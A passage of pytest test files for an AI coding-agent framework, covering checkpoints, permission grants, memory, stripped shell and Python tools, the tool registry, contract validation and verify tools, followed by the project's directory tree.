    def test_load_all_artifacts_empty(self, sm):
        assert sm.load_all_artifacts() == []

    def test_artifact_json_is_valid(self, sm):
        plan = ChangePlan(
            task_id="t1",
            steps=[PlanStep(description="create file", action="create")],
            rationale="needed",
        )
        path = sm.write_artifact("PLAN", 2, plan)
        data = json.loads(path.read_text())
        assert data["rationale"] == "needed"
        assert len(data["steps"]) == 1


# ---------------------------------------------------------------------------
# Checkpoints
# ---------------------------------------------------------------------------

class TestCheckpoints:
    def test_checkpoint_creates_copy(self, sm):
        tc = TaskContract(task_id="t1", description="Task")
        sm.write_artifact("INTAKE", 0, tc)
        cp_path = sm.checkpoint("pre_PATCH_001")
        assert cp_path.exists()
        assert (cp_path / "artifacts" / "000_INTAKE_TaskContract.json").exists()

    def test_rollback_restores_artifacts(self, sm):
        tc = TaskContract(task_id="t1", description="Original")
        sm.write_artifact("INTAKE", 0, tc)
        sm.checkpoint("pre_PATCH")

        # Write more artifacts after checkpoint
        rr = RunReport(exit_code=1, passed=False)
        sm.write_artifact("RUN", 1, rr)
        assert len(sm.load_all_artifacts()) == 2

        # Rollback should restore to checkpoint state
        sm.rollback("pre_PATCH")
        all_arts = sm.load_all_artifacts()
        assert len(all_arts) == 1
        assert all_arts[0]["task_id"] == "t1"

    def test_rollback_missing_checkpoint(self, sm):
        with pytest.raises(FileNotFoundError, match="not found"):
            sm.rollback("nonexistent")

    def test_checkpoint_overwrite(self, sm):
        tc1 = TaskContract(task_id="t1", description="First")
        sm.write_artifact("INTAKE", 0, tc1)
        sm.checkpoint("label")

        tc2 = TaskContract(task_id="t2", description="Second")
        sm.write_artifact("INTAKE", 1, tc2)
        sm.checkpoint("label")  # overwrites

        sm.rollback("label")
        all_arts = sm.load_all_artifacts()
        assert len(all_arts) == 2  # both artifacts present in second checkpoint


# ---------------------------------------------------------------------------
# Grants
# ---------------------------------------------------------------------------

class TestGrants:
    def test_write_grant(self, sm):
        grant = PermissionGrant(tool_name="run_shell_command", scope="*")
        path = sm.write_grant(grant)
        assert path.exists()
        assert path.name == "grant_000.json"
        data = json.loads(path.read_text())
        assert data["tool_name"] == "run_shell_command"

    def test_write_multiple_grants(self, sm):
        g1 = PermissionGrant(tool_name="run_shell_command", scope="*")
        g2 = PermissionGrant(tool_name="run_python_code", scope="*")
        p1 = sm.write_grant(g1)
        p2 = sm.write_grant(g2)
        assert p1.name == "grant_000.json"
        assert p2.name == "grant_001.json"


# ---------------------------------------------------------------------------
# Memory pins
# ---------------------------------------------------------------------------

class TestMemoryPins:
    def test_write_memory_pin(self, sm):
        pin = MemoryPin(
            embedding_backend="openai", model_name="text-embedding-3-large",
            query="what color", chunk_ids=[1, 2], similarity_scores=[0.9, 0.8],
        )
        path = sm.write_memory_pin(pin)
        assert path.exists()
        assert path.name == "pin_000.json"
        data = json.loads(path.read_text())
        assert data["query"] == "what color"

    def test_write_multiple_pins(self, sm):
        pin1 = MemoryPin(
            embedding_backend="openai", model_name="m",
            query="q1", chunk_ids=[1], similarity_scores=[0.9],
        )
        pin2 = MemoryPin(
            embedding_backend="openai", model_name="m",
            query="q2", chunk_ids=[2], similarity_scores=[0.8],
        )
        p1 = sm.write_memory_pin(pin1)
        p2 = sm.write_memory_pin(pin2)
        assert p1.name == "pin_000.json"
        assert p2.name == "pin_001.json"

```

## `tests/test_tool_stripping.py`

```python
# tests/test_tool_stripping.py
# Verify stripped tools return (rc, out, err), no retry, no repair, no sudo.

import subprocess
import pytest
from pathlib import Path
from unittest.mock import patch

from core.tools.run_shell import RunShellTool
from core.tools.run_python import RunPythonTool
from core.tools.install_project import InstallProjectTool
from core.tools.base_subprocess import RunSubprocessTool
from tests.conftest import make_fake_subprocess_runner


class TestRunShellToolStripped:
    def test_returns_tuple(self):
        runner = make_fake_subprocess_runner(rc=0, stdout="ok", stderr="")
        tool = RunShellTool(subprocess_runner=runner)
        result = tool("echo hi")
        assert isinstance(result, tuple)
        assert len(result) == 3
        rc, out, err = result
        assert rc == 0
        assert out == "ok"

    def test_no_retry_on_failure(self):
        """Tool should NOT retry on failure — returns immediately."""
        call_count = 0
        def counting_runner(cmd, *, shell, timeout, executable):
            nonlocal call_count
            call_count += 1
            return 1, "", "error"
        tool = RunShellTool(subprocess_runner=counting_runner)
        rc, out, err = tool("failing command")
        assert rc == 1
        assert call_count == 1  # No retries

    def test_no_run_with_retries_method(self):
        tool = RunShellTool(subprocess_runner=make_fake_subprocess_runner())
        assert not hasattr(tool, "_run_with_retries")

    def test_no_prepend_sudo_method(self):
        tool = RunShellTool(subprocess_runner=make_fake_subprocess_runner())
        assert not hasattr(tool, "_prepend_sudo")

    def test_no_install_dependency_method(self):
        tool = RunShellTool(subprocess_runner=make_fake_subprocess_runner())
        assert not hasattr(tool, "_install_dependency")

    def test_detect_missing_dependency_kept(self):
        tool = RunShellTool(subprocess_runner=make_fake_subprocess_runner())
        assert tool._detect_missing_dependency("bash: jq: command not found") == "jq"
        assert tool._detect_missing_dependency("all good") is None

    def test_timeout_parameter(self):
        runner = make_fake_subprocess_runner(rc=0, stdout="ok", stderr="")
        tool = RunShellTool(subprocess_runner=runner, timeout=30)
        rc, out, err = tool("echo hi", timeout=60)
        assert rc == 0


class TestRunPythonToolStripped:
    def test_returns_tuple(self):
        runner = make_fake_subprocess_runner(rc=0, stdout="42", stderr="")
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=runner,
        )
        result = tool("print(42)")
        assert isinstance(result, tuple)
        assert len(result) == 3
        rc, out, err = result
        assert rc == 0

    def test_no_retry_on_failure(self):
        call_count = 0
        def counting_runner(cmd, *, shell, timeout, executable):
            nonlocal call_count
            call_count += 1
            return 1, "", "SyntaxError"
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=counting_runner,
        )
        rc, out, err = tool("invalid python")
        assert rc == 1
        assert call_count == 1

    def test_no_repair_method(self):
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=make_fake_subprocess_runner(),
        )
        assert not hasattr(tool, "_repair")

    def test_no_install_dependency_method(self):
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=make_fake_subprocess_runner(),
        )
        assert not hasattr(tool, "_install_dependency")

    def test_detect_missing_dependency_kept(self):
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=make_fake_subprocess_runner(),
        )
        assert tool._detect_missing_dependency("No module named 'numpy'") == "numpy"
        assert tool._detect_missing_dependency("all good") is None

    def test_no_elf_parameter_required(self):
        """__call__ no longer requires elf parameter."""
        runner = make_fake_subprocess_runner(rc=0, stdout="ok", stderr="")
        tool = RunPythonTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=runner,
        )
        # Should work without elf
        rc, out, err = tool("print('hello')")
        assert rc == 0


class TestInstallProjectToolStripped:
    def test_returns_tuple(self, tmp_path):
        (tmp_path / "setup.py").write_text("from setuptools import setup; setup()")
        runner = make_fake_subprocess_runner(rc=0, stdout="installed", stderr="")
        tool = InstallProjectTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=runner,
        )
        result = tool(str(tmp_path))
        assert isinstance(result, tuple)
        assert len(result) == 3
        rc, out, err = result
        assert rc == 0

    def test_no_run_with_retries(self):
        tool = InstallProjectTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=make_fake_subprocess_runner(),
        )
        assert not hasattr(tool, "_run_with_retries")

    def test_no_installable_project(self, tmp_path):
        runner = make_fake_subprocess_runner()
        tool = InstallProjectTool(
            elfenv=Path("/tmp/fake_elfenv"),
            skip_venv_setup=True,
            subprocess_runner=runner,
        )
        rc, out, err = tool(str(tmp_path))
        assert rc == 1
        assert "No installable project" in err


class TestStaticUtilitiesKept:
    def test_extract_code(self):
        assert RunSubprocessTool.extract_code("```python\nprint(1)\n```", "python") == "print(1)"

    def test_is_root(self):
        # Just verify the method exists and returns a bool
        assert isinstance(RunSubprocessTool.is_root(), bool)

    def test_is_permission_error(self):
        assert RunSubprocessTool._is_permission_error("Permission denied") is True
        assert RunSubprocessTool._is_permission_error("all good") is False
        assert RunSubprocessTool._is_permission_error("") is False

```

## `tests/test_tools_registry.py`

```python
# tests/test_tools_registry.py

import pytest
from unittest.mock import MagicMock, patch

from core.tools import Tools
from core.tools.tool import Tool
from core.tools.bus import ToolBus
from core.tools.capability import CapabilityEngine
from core.contracts.schemas import PolicyPack


def _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython, spec=False):
    """Helper: configure mocked constructors so Tools.__init__ can register them."""
    mocks = {
        "run_shell_command": MockShell,
        "run_python_code": MockPython,
        "install_project": MockInstall,
        "fetch_page_content": MockFetch,
        "perform_web_search": MockWeb,
    }
    for name, mock_cls in mocks.items():
        instance = MagicMock(spec=Tool) if spec else MagicMock()
        instance.name = name
        instance.info.return_value = {"name": name, "description": f"Mock {name}"}
        mock_cls.return_value = instance
    return mocks


class TestToolsRegistry:
    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_list_tools(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        """Tools registry lists all registered tools."""
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        names = tools.list_tools()
        assert "run_shell_command" in names
        assert "run_python_code" in names
        assert "install_project" in names

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_get_tool(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython, spec=True)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        shell = tools.get_tool("run_shell_command")
        assert shell is not None
        assert tools.get_tool("nonexistent") is None

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_describe_tool(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython, spec=True)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        desc = tools.describe_tool("run_shell_command")
        assert "description" in desc

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_describe_unknown_tool(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        desc = tools.describe_tool("nonexistent")
        assert "error" in desc

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_run_tool(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython, spec=True)
        MockShell.return_value.return_value = "shell output"
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        result = tools.run("run_shell_command", "echo hi")
        assert result == "shell output"

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_run_unknown_tool_raises(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        with pytest.raises(ValueError, match="No such tool"):
            tools.run("nonexistent", "arg")

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_no_rag_tool_without_memory(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        """When memory=None, RagCrawlerTool is not registered."""
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        assert "rag_crawl" not in tools.list_tools()


class TestToolsToolBusIntegration:
    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_bus_property_exists(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        assert isinstance(tools.bus, ToolBus)

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_bus_has_registered_tools(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        bus_tools = tools.bus.list_tools()
        assert "run_shell_command" in bus_tools
        assert "run_python_code" in bus_tools
        assert "install_project" in bus_tools

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_custom_capability_engine(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        policy = PolicyPack(allowed_scopes=["shell.exec"])
        engine = CapabilityEngine(policy)
        tools = Tools(elfenv="/tmp/fake", memory=None, capability_engine=engine)
        assert tools.bus.capability_engine is engine

    @patch("core.tools.RunPythonTool")
    @patch("core.tools.InstallProjectTool")
    @patch("core.tools.RunShellTool")
    @patch("core.tools.FetchPageTool")
    @patch("core.tools.WebSearchTool")
    def test_bus_describe_tool(self, MockWeb, MockFetch, MockShell, MockInstall, MockPython):
        _setup_mocks(MockWeb, MockFetch, MockShell, MockInstall, MockPython)
        tools = Tools(elfenv="/tmp/fake", memory=None, enable_voice=False)
        desc = tools.bus.describe_tool("run_shell_command")
        assert desc["name"] == "run_shell_command"
        assert "shell.exec" in desc["required_scopes"]

```

## `tests/test_unified_client.py`

```python
# tests/test_unified_client.py

import pytest
from types import SimpleNamespace
from unittest.mock import MagicMock

from core.unified_client import UnifiedClient
from core.runtime.backends.openai_backend import OpenAIBackend


class TestUnifiedClientOpenAI:
    """Tests for UnifiedClient with injected OpenAI client."""

    def test_injected_client_skips_key_check(self):
        """When openai_client is provided, no API key is needed."""
        mock_openai = MagicMock()
        client = UnifiedClient(provider_override="openai", openai_client=mock_openai)
        assert client.provider == "openai"
        assert isinstance(client._backend, OpenAIBackend)

    def test_chat_non_streaming(self):
        mock_openai = MagicMock()
        mock_openai.chat.completions.create.return_value = SimpleNamespace(
            choices=[SimpleNamespace(message=SimpleNamespace(content="Hello!"))]
        )
        client = UnifiedClient(provider_override="openai", openai_client=mock_openai)
        result = client.chat(model="gpt-4o-mini", messages=[{"role": "user", "content": "hi"}])
        assert result == "Hello!"
        mock_openai.chat.completions.create.assert_called_once()

    def test_chat_streaming(self):
        mock_openai = MagicMock()
        chunks = [
            SimpleNamespace(choices=[SimpleNamespace(delta=SimpleNamespace(content="Hi"))]),
            SimpleNamespace(choices=[SimpleNamespace(delta=SimpleNamespace(content=" there"))]),
        ]
        mock_openai.chat.completions.create.return_value = iter(chunks)
        client = UnifiedClient(provider_override="openai", openai_client=mock_openai)
        result = client.chat(model="gpt-4o-mini", messages=[{"role": "user", "content": "hi"}], stream=True)
        collected = list(result)
        assert len(collected) == 2

    def test_missing_key_raises_without_injection(self):
        with pytest.raises(RuntimeError, match="Missing OPENAI_API_KEY"):
            UnifiedClient(provider_override="openai")


class TestUnifiedClientMistral:
    """Tests for Mistral provider (no injection needed — just key check)."""

    def test_missing_mistral_key_raises(self):
        with pytest.raises(RuntimeError, match="Missing MISTRAL_API_KEY"):
            UnifiedClient(provider_override="mistral")

    def test_unsupported_provider_raises(self):
        with pytest.raises(ValueError, match="Unsupported provider"):
            UnifiedClient(provider_override="unsupported")

```

## `tests/test_unified_memory.py`

```python
# tests/test_unified_memory.py

import pytest
import numpy as np

from core.memory.memory import UnifiedMemory


class TestShortTermMemory:
    def test_add_and_load_short(self, memory):
        memory.add_short("user", "hello")
        memory.add_short("assistant", "hi there")
        rows = memory.load_short(n=10)
        assert len(rows) == 2
        assert rows[0]["role"] == "user"
        assert rows[0]["content"] == "hello"
        assert rows[1]["role"] == "assistant"

    def test_load_short_respects_limit(self, memory):
        for i in range(10):
            memory.add_short("user", f"msg {i}")
        rows = memory.load_short(n=3)
        assert len(rows) == 3

    def test_reset_short(self, memory):
        memory.add_short("user", "something")
        memory.reset_short()
        rows = memory.load_short()
        assert len(rows) == 0

    def test_load_short_empty(self, memory):
        rows = memory.load_short()
        assert rows == []


class TestLongTermMemory:
    def test_add_and_search_long(self, memory):
        memory.add_long("user", "The capital of France is Paris")
        memory.add_long("assistant", "Paris is a beautiful city")
        results = memory.search_long("What is the capital of France?", top_k=2)
        assert len(results) > 0
        assert all("content" in r for r in results)

    def test_search_long_empty(self, memory):
        results = memory.search_long("anything")
        assert results == []

    def test_purge_long(self, memory):
        memory.add_long("user", "remember this")
        memory.purge_long()
        assert memory.long_index is None
        assert memory.long_id_map == []
        results = memory.search_long("remember")
        assert results == []


class TestAdventures:
    def test_add_and_list_adventures(self, memory):
        memory.add_adventure("test prompt", "print('hi')", "hi", "python", True)
        memory.add_adventure("test 2", "ls -la", "files", "shell", False)
        adventures = memory.list_adventures(n=10)
        assert len(adventures) == 2
        assert adventures[0]["prompt"] == "test prompt"
        assert adventures[0]["success"] is True
        assert adventures[1]["success"] is False

    def test_list_adventures_empty(self, memory):
        assert memory.list_adventures() == []


class TestModelLock:
    def test_model_lock_mismatch_raises(self, tmp_path, fake_embedding_client):
        db = tmp_path / "lock_test.db"
        UnifiedMemory(db, model="text-embedding-3-large", embedding_client=fake_embedding_client)
        with pytest.raises(RuntimeError, match="Embedding model mismatch"):
            UnifiedMemory(db, model="text-embedding-3-small", embedding_client=fake_embedding_client)

    def test_model_lock_same_model_ok(self, tmp_path, fake_embedding_client):
        db = tmp_path / "lock_test2.db"
        UnifiedMemory(db, model="text-embedding-3-large", embedding_client=fake_embedding_client)
        mem2 = UnifiedMemory(db, model="text-embedding-3-large", embedding_client=fake_embedding_client)
        assert mem2.model == "text-embedding-3-large"


class TestIndexRebuild:
    def test_rebuild_long_index_from_db(self, tmp_path, fake_embedding_client):
        db = tmp_path / "rebuild_test.db"
        mem1 = UnifiedMemory(db, embedding_client=fake_embedding_client)
        mem1.add_long("user", "fact one")
        mem1.add_long("user", "fact two")

        # Create a new instance — it should rebuild from DB
        mem2 = UnifiedMemory(db, embedding_client=fake_embedding_client)
        assert mem2.long_index is not None
        assert len(mem2.long_id_map) == 2

```

## `tests/test_validation.py`

```python
# tests/test_validation.py — Tests for contract validation

import pytest
from pydantic import ValidationError

from core.kernel.state import Phase
from core.context.models import RepoMapResult
from core.contracts.schemas import (
    TaskContract,
    ChangePlan,
    PlanStep,
    ContextPack,
    PatchSet,
    RunReport,
    FinalReport,
)
from core.contracts.validation import get_schema_for_phase, validate_phase_output


# ---------------------------------------------------------------------------
# get_schema_for_phase
# ---------------------------------------------------------------------------

class TestGetSchemaForPhase:
    def test_intake_returns_task_contract(self):
        assert get_schema_for_phase(Phase.INTAKE) is TaskContract

    def test_plan_returns_change_plan(self):
        assert get_schema_for_phase(Phase.PLAN) is ChangePlan

    def test_run_returns_run_report(self):
        assert get_schema_for_phase(Phase.RUN) is RunReport

    def test_finalize_returns_final_report(self):
        assert get_schema_for_phase(Phase.FINALIZE) is FinalReport

    def test_repo_map_returns_repo_map_result(self):
        """REPO_MAP now has a structured schema."""
        assert get_schema_for_phase(Phase.REPO_MAP) is RepoMapResult

    def test_critique_returns_none(self):
        assert get_schema_for_phase(Phase.CRITIQUE) is None

    def test_fix_returns_none(self):
        assert get_schema_for_phase(Phase.FIX) is None

    def test_halted_returns_none(self):
        assert get_schema_for_phase(Phase.HALTED) is None

    def test_completed_returns_none(self):
        assert get_schema_for_phase(Phase.COMPLETED) is None


# ---------------------------------------------------------------------------
# validate_phase_output — happy path
# ---------------------------------------------------------------------------

class TestValidatePhaseOutputHappy:
    def test_validate_dict(self):
        data = {"task_id": "t1", "description": "Add pagination"}
        result = validate_phase_output(Phase.INTAKE, data)
        assert isinstance(result, TaskContract)
        assert result.task_id == "t1"

    def test_validate_existing_model(self):
        tc = TaskContract(task_id="t1", description="Fix bug")
        result = validate_phase_output(Phase.INTAKE, tc)
        assert result is tc

    def test_validate_plan_from_dict(self):
        data = {
            "task_id": "t1",
            "steps": [{"description": "create file", "action": "create"}],
        }
        result = validate_phase_output(Phase.PLAN, data)
        assert isinstance(result, ChangePlan)
        assert len(result.steps) == 1

    def test_validate_run_report(self):
        data = {"exit_code": 0, "passed": True, "stdout": "ok"}
        result = validate_phase_output(Phase.RUN, data)
        assert isinstance(result, RunReport)
        assert result.passed is True

    def test_validate_final_report(self):
        data = {
            "task_description": "add pagination",
            "outcome": "completed",
            "total_iterations": 10,
        }
        result = validate_phase_output(Phase.FINALIZE, data)
        assert isinstance(result, FinalReport)

    def test_validate_context_pack(self):
        data = {"task_id": "t1", "repo_map_excerpt": "src/"}
        result = validate_phase_output(Phase.RETRIEVE, data)
        assert isinstance(result, ContextPack)

    def test_validate_patch_set(self):
        data = {"task_id": "t1", "patches": [{"file_path": "a.py"}]}
        result = validate_phase_output(Phase.PATCH, data)
        assert isinstance(result, PatchSet)


# ---------------------------------------------------------------------------
# validate_phase_output — error cases
# ---------------------------------------------------------------------------

class TestValidatePhaseOutputErrors:
    def test_no_schema_for_phase(self):
        with pytest.raises(ValueError, match="No schema defined"):
            validate_phase_output(Phase.CRITIQUE, {})

    def test_invalid_dict_data(self):
        """Missing required fields should raise ValidationError."""
        with pytest.raises(ValidationError):
            validate_phase_output(Phase.INTAKE, {"task_id": "t1"})  # missing description

    def test_wrong_type_raises(self):
        """Non-dict, non-model data should raise."""
        with pytest.raises((ValidationError, TypeError)):
            validate_phase_output(Phase.INTAKE, "not a dict")

    def test_invalid_field_type(self):
        with pytest.raises(ValidationError):
            validate_phase_output(Phase.RUN, {"exit_code": "not_an_int"})

```

## `tests/test_verify_tools.py`

```python
# tests/test_verify_tools.py — VerifyTool tests

import pytest
from core.tools.verify_tools import VerifyTool


def make_runner(rc=0, stdout="", stderr=""):
    def runner(cmd, *, shell=False, timeout=None, executable=None):
        return rc, stdout, stderr
    return runner


@pytest.fixture
def verify():
    return VerifyTool(subprocess_runner=make_runner(0, "ok", ""))


class TestVerifyDefaults:
    def test_lint_default(self, verify):
        rc, out, err = verify("lint")
        assert rc == 0

    def test_test_default(self, verify):
        rc, out, err = verify("test")
        assert rc == 0

    def test_typecheck_default(self, verify):
        rc, out, err = verify("typecheck")
        assert rc == 0

    def test_format_default(self, verify):
        rc, out, err = verify("format")
        assert rc == 0

    def test_unknown_action(self, verify):
        rc, out, err = verify("explode")
        assert rc == 1
        assert "unknown" in err.lower()


class TestVerifyConfigOverride:
    def test_override_lint(self):
        config = {"verification": {"lint": "flake8 ."}}
        # Capture the command that gets run
        captured = {}
        def capturing_runner(cmd, *, shell=False, timeout=None, executable=None):
            captured["cmd"] = cmd
            return 0, "ok", ""
        vt = VerifyTool(config=config, subprocess_runner=capturing_runner)
        rc, out, err = vt("lint")
        assert rc == 0
        assert captured["cmd"] == "flake8 ."

    def test_override_test(self):
        config = {"verification": {"test": "python -m unittest discover"}}
        captured = {}
        def capturing_runner(cmd, *, shell=False, timeout=None, executable=None):
            captured["cmd"] = cmd
            return 0, "", ""
        vt = VerifyTool(config=config, subprocess_runner=capturing_runner)
        vt("test")
        assert captured["cmd"] == "python -m unittest discover"

    def test_partial_override_uses_defaults(self):
        config = {"verification": {"lint": "custom_lint"}}
        captured = {}
        def capturing_runner(cmd, *, shell=False, timeout=None, executable=None):
            captured["cmd"] = cmd
            return 0, "", ""
        vt = VerifyTool(config=config, subprocess_runner=capturing_runner)
        vt("test")  # not overridden
        assert captured["cmd"] == "pytest"

    def test_empty_config(self):
        captured = {}
        def capturing_runner(cmd, *, shell=False, timeout=None, executable=None):
            captured["cmd"] = cmd
            return 0, "", ""
        vt = VerifyTool(config={}, subprocess_runner=capturing_runner)
        vt("lint")
        assert captured["cmd"] == "ruff check ."

    def test_none_config(self):
        captured = {}
        def capturing_runner(cmd, *, shell=False, timeout=None, executable=None):
            captured["cmd"] = cmd
            return 0, "", ""
        vt = VerifyTool(config=None, subprocess_runner=capturing_runner)
        vt("format")
        assert captured["cmd"] == "ruff format --check ."


class TestVerifyFailure:
    def test_command_failure_returns_error(self):
        vt = VerifyTool(subprocess_runner=make_runner(1, "", "lint errors"))
        rc, out, err = vt("lint")
        assert rc == 1
        assert err == "lint errors"

```

<details>
<summary>📁 Final Project Structure</summary>

```
📁 build/
    📁 bdist.linux-x86_64/
    📁 lib/
        📁 core/
            📁 memory/
                📄 __init__.py
                📄 memory.py
            📁 tools/
                📁 recon/
                    📄 __init__.py
                    📄 google_hacks.py
                    📄 whois.py
                📄 __init__.py
                📄 base_subprocess.py
                📄 fetch_page.py
                📄 install_project.py
                📄 rag_crawler.py
                📄 run_python.py
                📄 run_shell.py
                📄 tool.py
                📄 voice.py
                📄 web_search.py
            📄 __init__.py
            📄 bootstrap.py
            📄 cli.py
            📄 elf.py
            📄 unified_client.py
        📁 judais/
            📄 __init__.py
            📄 judais.py
        📁 lobi/
            📄 __init__.py
            📄 lobi.py
📁 configs/
📁 core/
    📁 context/
        📁 symbols/
        📄 __init__.py
        📄 file_discovery.py
        📄 models.py
    📁 contracts/
        📄 __init__.py
        📄 schemas.py
        📄 validation.py
    📁 kernel/
        📄 __init__.py
        📄 budgets.py
        📄 orchestrator.py
        📄 state.py
    📁 memory/
        📄 __init__.py
        📄 memory.py
    📁 policy/
        📄 __init__.py
        📄 audit.py
        📄 god_mode.py
        📄 profiles.py
    📁 runtime/
        📁 backends/
            📄 __init__.py
            📄 base.py
            📄 local_backend.py
            📄 mistral_backend.py
            📄 openai_backend.py
        📄 __init__.py
        📄 messages.py
        📄 provider_config.py
    📁 sessions/
        📄 __init__.py
        📄 manager.py
    📁 tools/
        📁 recon/
            📄 __init__.py
            📄 google_hacks.py
            📄 whois.py
        📄 __init__.py
        📄 base_subprocess.py
        📄 bus.py
        📄 capability.py
        📄 config_loader.py
        📄 descriptors.py
        📄 executor.py
        📄 fetch_page.py
        📄 fs_tools.py
        📄 git_tools.py
        📄 install_project.py
        📄 rag_crawler.py
        📄 run_python.py
        📄 run_shell.py
        📄 sandbox.py
        📄 speech.wav
        📄 tool.py
        📄 verify_tools.py
        📄 voice.py
        📄 web_search.py
    📄 __init__.py
    📄 agent.py
    📄 bootstrap.py
    📄 cli.py
    📄 kv_prefix.py
    📄 unified_client.py
📁 data/
📁 dist/
    📄 judais_lobi-0.7.2-py3-none-any.whl
    📄 judais_lobi-0.7.2.tar.gz
📁 images/
    📄 judais-lobi.png
    📄 lobi.png
📁 judais/
    📄 __init__.py
    📄 judais.py
📁 judais_lobi.egg-info/
    📄 dependency_links.txt
    📄 entry_points.txt
    📄 PKG-INFO
    📄 requires.txt
    📄 SOURCES.txt
    📄 top_level.txt
📁 lobi/
    📄 __init__.py
    📄 lobi.py
    📄 README.md
📁 scripts/
📁 tests/
    📄 __init__.py
    📄 conftest.py
    📄 test_agent.py
    📄 test_agent_run_task.py
    📄 test_audit.py
    📄 test_backends.py
    📄 test_base_subprocess.py
    📄 test_bus.py
    📄 test_bus_grants.py
    📄 test_bus_preflight.py
    📄 test_capability.py
    📄 test_cli_smoke.py
    📄 test_config_loader.py
    📄 test_contracts.py
    📄 test_descriptors.py
    📄 test_descriptors_expanded.py
    📄 test_file_discovery.py
    📄 test_fs_tools.py
    📄 test_git_tools.py
    📄 test_god_mode.py
    📄 test_judais.py
    📄 test_kernel_budgets.py
    📄 test_kernel_orchestrator.py
    📄 test_kernel_state.py
    📄 test_kv_prefix.py
    📄 test_lobi.py
    📄 test_messages.py
    📄 test_orchestrator_sessions.py
    📄 test_profile_schemas.py
    📄 test_profiles.py
    📄 test_provider_config.py
    📄 test_repo_map_models.py
    📄 test_sandbox.py
    📄 test_session_manager.py
    📄 test_tool_stripping.py
    📄 test_tools_registry.py
    📄 test_unified_client.py
    📄 test_unified_memory.py
    📄 test_validation.py
    📄 test_verify_tools.py
📄 LICENSE
📄 main.py
📄 Makefile
📄 MANIFESTO.md
📄 project.md
📄 pyproject.toml
📄 README.md
📄 requirements.txt
📄 ROADMAP.md
📄 setup.py
📄 speech.wav
```

</details>
